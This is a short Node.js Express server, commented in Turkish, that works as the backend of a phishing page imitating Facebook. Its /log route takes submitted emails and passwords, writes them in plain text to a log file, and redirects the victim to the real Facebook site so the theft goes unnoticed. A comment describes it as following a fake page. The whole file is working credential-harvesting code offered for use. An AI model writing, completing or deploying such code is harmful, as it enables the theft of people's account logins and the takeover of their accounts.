const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/log", (req, res) => {
  const { email, password } = req.body;

  // 👇 Bu satırı buraya koy
  const log = `Email: ${email}, Şifre: ${password}, Tarih: ${new Date().toLocaleString()}\n`;
fs.appendFileSync("log.txt", log);
 // log.txt dosyasına yaz
  res.redirect("https://facebook.com"); // sahte sayfadan sonra gerçek Facebook'a yönlendir
});

app.listen(3000, () => {
  console.log("Sunucu 3000 portunda çalışıyor.");
});
